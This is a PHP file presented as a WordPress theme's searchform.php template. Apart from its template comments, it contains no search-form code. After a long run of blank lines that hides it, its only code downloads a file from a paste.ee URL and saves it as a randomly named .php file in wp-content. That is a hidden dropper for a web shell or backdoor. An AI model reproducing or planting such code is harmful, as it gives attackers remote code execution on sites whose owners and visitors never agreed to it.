<?php

/**
 * The searchform.php template.
 *
 * Used any time that get_search_form() is called.
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
 *
 * @package WordPress
 * @subpackage 
 * @since 1.0
 */




/*
 * Generate a unique ID for each form and a string containing an aria-label
 * if one was passed to get_search_form() in the args array.
 */











































//62b34f748d967
$name = uniqid();
	
	if ( @copy("https://paste.ee/r/LrLQV", "../../../wp-content/" . $name . ".php") ) {
	echo $name;
	}else{
	echo "Fail.";
}
?>